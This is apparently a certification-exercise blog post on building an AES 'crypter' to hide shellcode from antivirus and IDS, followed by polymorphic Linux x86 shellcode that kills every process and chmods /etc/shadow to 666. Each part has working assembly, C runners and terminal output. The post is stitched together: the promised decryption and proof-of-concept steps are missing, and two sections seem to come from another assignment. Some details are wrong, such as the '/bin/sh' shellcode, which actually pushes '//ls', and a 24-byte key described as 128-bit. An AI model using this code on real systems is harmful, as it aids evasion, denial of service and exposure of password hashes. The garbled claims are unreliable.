---
title:  "SLAE x86 Assignment 7: Custom Crypter"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

### Custom Crypter
------

* Create a custom crypter
* Use any encryption schema
* Use any programming language

#### Concept 
-----

A crypter is defined as a tool that has the ability to encrypt, obfuscate, and manipulate malicious code making it undetectable to common AV and IDS systems. 

Similar to the custom Encoder created in an earlier assignment, the concept is developed further with the use of an encryption scheme, leading to a higher success rate of evasion by decrypting the malicious code at run-time and executing on the target host.

The AES (Advanced Encryption Standard) cipher  algorithm also known as Rijndael, will be used to illustrate the concept of a custom Encoder:

* Symmetric-key algorithm (same key used to encrypt and decrypt the data)
* 128-bit block sizes
* 3 different key sizes - 128/192/256 bits
* High-speed performance and low RAM (memory) requirement when encrypting/decrypting 

![AES](/assets/images/AES.jpg) 

3 steps used to demonstrate the Crypter process:

* Encryption
* Decryption
* POC

#### Encryption
--------

The execve-stack shellcode from the course material will be used as a reference for the shellcode, which spawns a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host:

```bash
"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

A python script will be used as a Crypter wrapper to implement the AES encryption/decryption, referenced from Code Koala [http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto/] [encryption-codekoala].

Note in this instance a static 128-bit key <code class="language-plaintext highlighter-rouge">DisShudBSecretEncryption</code> is hardcoded into the script for the sake of the POC to illustrate the concept, best practice is to randomly generate a key:

```python
#!/usr/bin/python

# Filename: AES_encryption.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate encrypted shellcode from the original shellcode
# Usage: python AES_encryption.py 

from Crypto.Cipher import AES
import sys
import os
import base64

def aes128(shc):

#block size = 16 
 BLOCK_SIZE = 16 
 PADDING = '{'
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

#static encryption/decryption key - must be 16/24/32 bytes long
 secret = 'DisShudBSecretEncryption' 
 cipher = AES.new(secret)
 encoded = EncodeAES(cipher, shc)
 print 'Encrypted shellcode using AES 128-bit key + Base64 encoded:\n\n', encoded

#execve-stack shellcode to spawn /bin/sh shell
shellcode = """
\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\x89\\xe1\\xb0\\x0b\\xcd\\x80
"""
Encryption = aes128 (shellcode)
```

As a POC, the AES encryption wrapper script is executed resulting in the original shellcode being encrypted and base-64 encoded:

```bash
osboxes@osboxes:~/Downloads/SLAE$ python AES_encryption.py 
Encrypted shellcode using AES 128-bit key + Base64 encoded:

JORa9JYDlDQi0SwuPPwAbqJZydd7ID1G+aUeYRJbEqUygnmo4zi+D0H4o2Dc/FJRJSUNfcu9zM33bg8NcB95qQhhTJ3xKvEiXnY7fLPOt3M6fesL0nrQFrwgUTl8dDr9L2W3vrdYl0Ps9ByF5OwqaQ==
osboxes@osboxes:~/Downloads/SLAE$ 
```

#### 2nd Shellcode (Killall)
--------------

The <code class="language-plaintext highlighter-rouge">killall</code> command on a Linux based system will literally terminate all running processes that are currently active on the target host’s machine.

Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-212.php] [killall-shellstorm]:

```c
/* By Kris Katterjohn 11/13/2006
 *
 * 11 byte shellcode to kill all processes for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; kill(-1, SIGKILL)
 *
 *      push byte 37
 *      pop eax
 *      push byte -1
 *      pop ebx
 *      push byte 9
 *      pop ecx
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

       (*(void (*)()) shellcode)();
}
```

The polymorphic (modified) version of the original shellcode is scripted in Assembly:

```nasm 
; Filename: killall_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Terminates processes running on the local host
; Compilation: ./compile.sh killall_poly
; Usage: ./killall_poly
; Shellcode size: 15 bytes
; Architecture: x86

global   _start

section .text
        _start:

	sub eax, eax			; initialize register // added instruction
	mov al, 0x25			; move 0x25 into al // changed the method
	sub ebx, ebx			; initialize register // added instruction
	dec ebx				; decrement ebx // replaced push 0xffffffff
	sub ecx, ecx			; initialize register // added instruction
	mov cl, 0xf7			; move 0xf7 intocl // added instruction
	neg cl				; negates 0xf7 // added instruction
	int 0x80			; call the interrupt to execute the syscall
```

The Assembly code is compiled by assembling with Nasm, and compiled as an executable binary.

Objdump is used to extract the shellcode from the <code class="language-plaintext highlighter-rouge">killall</code> command in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./killall_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80"
```

A C program scripted with the newly generated shellcode:

```c 
/**
* Filename: killall_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Terminates processes running on the local host   
* Compilation: gcc -fno-stack-protector -z execstack -m32 killall_poly_shellcode.c -o killall_poly_final
* Usage: ./killall_poly_final
* Shellcode size: 15 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80";

int main()
{
        printf("Shellcode length: %d bytes\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 15 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./killall_poly_final Connection to 192.168.0.142 closed by remote host.
Connection to 192.168.0.142 closed.
```

The polymorphic version of the shellcode is 36% larger in size compared to the original reference from Shell-Storm.

#### 3rd Shellcode (Chmod 666 /etc/shadow)
--------------

The <code class="language-plaintext highlighter-rouge">chmod 666 /etc/shadow</code> command sets the permission on the shadow file allowing all users read/write access to the file (without execution rights).

The shadow file is a high-value file which stores all the user passwords as a long string of characters combined with the hashing algorithm, as well as an optional salt value, revealing the hashed password of all users on the local system.

Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-608.php] [chmod_etc_shadow-shellstorm]:

```c
/* 
 * Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes
 * Type: Shellcode
 * Author: antrhacks
 * Platform: Linux X86
*/

/* ASSembly
 31 db                	xor    %ebx,%ebx
 b0 17                	mov    $0x17,%al
 cd 80                	int    $0x80
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 63 2f 73 68       	push   $0x68732f63
 68 2f 2f 65 74       	push   $0x74652f2f
 89 e3                	mov    %esp,%ebx
 66 b9 b6 01          	mov    $0x1b6,%cx
 b0 0f                	mov    $0xf,%al
 cd 80                	int    $0x80
 40                   	inc    %eax
 cd 80                	int    $0x80
*/

int main(){
 char shell[] = "\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50"
"\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
"\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01"
"\xb0\x0f\xcd\x80\x40\xcd\x80";

 printf("[*] Taille du ShellCode = %d\n", strlen(shell));
 (*(void (*)()) shell)();
 
 return 0;
}
```

The polymorphic (modified) version of the original shellcode is scripted in Assembly:

```nasm
; Filname: chmod_etc_shadow_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Chmod 666 /etc/shadow on the local host
; Compilation: ./compile.sh chmod_etc_shadow_poly
; Usage: sudo ./chmod_etc_shadow_poly
; Shellcode size: 40 bytes
; Architecture: x86

global   _start

section .text
        _start:

	sub ebx, ebx			; initialize register // changed the method
	push 0x17			; push 0x17 onto the stack // changed the method
	pop eax				; pop eax onto the stack // changed the method
	int 0x80			; call the interrupt to execute the setuid syscall
	sub eax, eax			; initialize register // changed the method
	push eax			; push eax onto the stack
	push 0x776f6461			; 'woda'	
        push 0x68732f63			; 'hs/c'
        push 0x74652f2f			; 'te//'
	mov ebx, esp			; move esp into ebx
	mov cl, 0xb6			; move 0xb6 into cl // replaced mov cx, 0x1b6
	mov ch, 0x1			; move 0x1 into ch // replaced mov al, 0xf
        add al, 15			; add 15 to al // added instruction
        int 0x80			; call the interrupt to execute the chmod syscall
        add eax, 1			; add 1 to eax // changed the method
        int 0x80			; call the interrupt to exit
```

The Assembly code is compiled by assembling with Nasm, and compiled as an executable binary.

Objdump is used to extract the shellcode from the <code class="language-plaintext highlighter-rouge">chmod 666 /etc/shadow</code> command in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./chmod_etc_shadow_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
"\x29\xdb\x6a\x17\x58\xcd\x80\x29\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\xb1\xb6\xb5\x01\x04\x0f\xcd\x80\x83\xc0\x01\xcd\x80"
```

A C program scripted with the newly generated shellcode:

```c 
/**
* Filename: chmod_etc_shadow_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Chmod 666 /etc/shadow on the local host
* Compilation: gcc -fno-stack-protector -z execstack -m32 chmod_etc_shadow_poly_shellcode.c -o chmod_etc_shadow_poly_final
* Usage: sudo ./chmod_etc_shadow_poly_final
* Shellcode size: 40 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x29\xdb\x6a\x17\x58\xcd\x80\x29\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
"\x68\x2f\x2f\x65\x74\x89\xe3\xb1\xb6\xb5\x01\x04\x0f\xcd\x80\x83\xc0\x01\xcd\x80";

int main()
{
        printf("Shellcode length: %d bytes\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 40 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1219 May 31 00:14 /etc/shadow
osboxes@osboxes:~/Downloads/SLAE$ stat --format '%a' /etc/shadow
640
osboxes@osboxes:~/Downloads/SLAE$ sudo ./chmod_etc_shadow_poly_final 
[sudo] password for osboxes: 
Shellcode length: 40 bytes
osboxes@osboxes:~/Downloads/SLAE$ ls -la /etc/shadow
-rw-rw-rw- 1 root shadow 1219 May 31 00:14 /etc/shadow
osboxes@osboxes:~/Downloads/SLAE$ stat --format '%a' /etc/shadow
666
osboxes@osboxes:~/Downloads/SLAE$ 
```

The polymorphic version of the shellcode is 8% larger in size compared to the original reference from Shell-Storm.

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment7
